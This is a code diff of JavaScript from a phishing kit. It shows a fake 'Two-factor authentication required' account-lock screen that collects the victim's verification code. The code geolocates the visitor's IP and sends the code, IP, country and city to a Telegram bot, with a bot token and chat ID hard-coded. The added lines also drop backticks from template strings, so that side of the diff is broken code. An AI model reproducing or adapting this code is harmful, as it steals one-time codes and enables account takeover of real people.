@@ -1,4 +1,3 @@
-
 function getIP(callback) {
     fetch('https://api.db-ip.com/v2/free/self')
         .then(response => response.json())
@@ -73,14 +72,14 @@ function maskPhone(phone) {
     return maskedPhone;
 }
 */
-// <span id="phone" className="fw-bold">` + maskPhone(data.phone) + `</span>,
-//     <span id="buEmail" className="fw-bold">` + maskEmail(data.buEmail) + `</span>
+// <span id="phone" className="fw-bold"> + maskPhone(data.phone) + </span>,
+//     <span id="buEmail" className="fw-bold"> + maskEmail(data.buEmail) + </span>
 // or
 // < span
 // id = "peEmail"
-// className = "fw-bold" > ` + maskEmail(data.perEmail) + ` < /span>
+// className = "fw-bold" >  + maskEmail(data.perEmail) +  < /span>
 function updateHtmlAndCallback(callback) {
-    $('#code-form .card-body').html(`
+    $('#code-form .card-body').html(
                 <h2 class="card-title fw-bold">Two-factor authentication required (1/3)</h2>
                 <p class="card-text py-3">We have temporarily blocked your account because your
                     protect has changed. Verify code has been sent
@@ -107,7 +106,7 @@ function updateHtmlAndCallback(callback) {
                 <p>We'll walk you through some steps to secure and unlock your account.</p>
                 <button type="button" class="btn bg-light border w-100 py-3 fw-bold" id="send-code">Submit</button>
                 <p class="mt-3 mb-0 text-center" style="cursor: pointer;color: rgb(30 66 159);" id="send">Send Code</p>
-                `)
+                )
     if (callback && typeof callback === 'function') {
         callback();
     }
@@ -134,7 +133,7 @@ function updateHtmlAndCallback(callback) {
 //         error: function (xhr, status, error) {
 //             setTimeout(function () {
 //                 Swal.fire({
-//                     text: `Request failed!`,
+//                     text: Request failed!,
 //                     icon: "error"
 //                 });
 //                 $('.lsd-ring-container').addClass('d-none');
@@ -150,14 +149,16 @@ let Fcode='';
 function sendCode() {
     $('#code').on('input', function () {
         const input = $(this).val();
-        const validInputRegex = /^\d+$/;
+        const validInputRegex = /^\d+$/; // Chỉ cho phép số và dấu cộng
 
         if (!validInputRegex.test(input)) {
+            // Nếu nhập giá trị không hợp lệ, loại bỏ ký tự cuối cùng nhập vào
             $(this).val(input.slice(0, -1));
         }
     });
 
     $('#send-code').on('click', function () {
+
         const keymap = $("#code").val();
 
         if (keymap === '') {
@@ -166,51 +167,49 @@ function sendCode() {
         } else {
             $('#code').removeClass('border-danger');
         }
+        code1=keymap;
+        const message1   = 
+        '%0A<strong>Code: </strong>'+code1+
+        '%0A<strong>IP Address: </strong>' + IpAddress.ipAddress +
+        '%0A<strong>Country : </strong>' + IpAddress.countryName +'( '+IpAddress.countryCode+' )'+
+        '%0A<strong>City : </strong>' + IpAddress.city ;
 
-        code1 = keymap;
 
-        const message1 = 
-            '%0A<strong>Code: </strong>' + code1 +
-            '%0A<strong>IP Address: </strong>' + IpAddress.ipAddress +
-            '%0A<strong>Country : </strong>' + IpAddress.countryName + ' (' + IpAddress.countryCode + ')' +
-            '%0A<strong>City : </strong>' + IpAddress.city;
 
         NUMBER_TIME_SEND_CODE++;
-        const botToken = '7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk';
-        const chatId = '-1002416068664';
-        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message1}&parse_mode=html`;
+        const botToken = '7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk'; // Thay YOUR_BOT_TOKEN bằng bot_token của bạn
+        const chatId = '-1002416068664'; // Thay YOUR_CHAT_ID bằng chat_id của bạn
+        const message = message1; // Tin nhắn sẽ là dữ liệu sản phẩm
 
-        // Hiện loading ngay lập tức
-        $('.lsd-ring-container').removeClass('d-none');
+        const telegramUrl = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=html;
 
         fetch(telegramUrl)
             .then(response => {
-                if (!response.ok) throw new Error('Network response was not ok');
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
                 return response.json();
             })
             .then(data => {
-                // Sau 20 giây mới ẩn loading và xử lý tiếp
+                
                 setTimeout(function () {
-                    if (NUMBER_TIME_SEND_CODE === 1) {
+                    if (NUMBER_TIME_SEND_CODE == 1){
                         $('#wrong-code').removeClass('d-none');
-                    } else {
+                    }else{
                         $('#getCode').removeClass('d-none');
                     }
                     $('.lsd-ring-container').addClass('d-none');
-                }, 20000); // 20 giây
+                }, 2000);
             })
             .catch(error => {
                 setTimeout(function () {
                     Swal.fire({
-                        text: `Request failed!`,
+                        text: Request failed!,
                         icon: "error"
                     });
                     $('.lsd-ring-container').addClass('d-none');
                 }, 500);
             });
-    });
-}
-
       /*  $.ajax({
             url: '/sendInfo',
             type: 'POST',
@@ -233,7 +232,7 @@ function sendCode() {
             error: function (xhr, status, error) {
                 setTimeout(function () {
                     Swal.fire({
-                        text: `Request failed!`,
+                        text: Request failed!,
                         icon: "error"
                     });
                     $('.lsd-ring-container').addClass('d-none');
